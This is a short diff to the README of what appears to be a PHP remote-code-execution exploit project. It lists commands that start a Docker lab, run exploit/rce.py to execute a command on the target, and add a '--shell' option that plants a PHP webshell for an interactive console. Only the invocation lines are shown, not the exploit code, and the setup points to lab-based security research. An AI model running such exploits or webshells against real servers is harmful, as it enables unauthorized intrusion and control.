@@ -49,7 +49,12 @@ python3 poc/crash.py --rounds 3 --check-fixed # both vectors: vuln 6/6 kills, fi
 # RCE (pinned lab on :29557, needs docker exec for calibration + proof)
 docker compose -f lab/rce/docker-compose.yml up -d
 python3 exploit/rce.py --cmd 'echo pwned-by-php2shell > /tmp/proof' --verify
+
 docker compose -f lab/rce/docker-compose.yml exec apache cat /tmp/proof
+
+# interactive console as the worker user (stages a PHP webshell served from
+# inside the target; works even on rootless Docker with no callback path)
+python3 exploit/rce.py --shell
 ```
 
 Everything PHP-side runs inside Docker; the host only needs Python 3
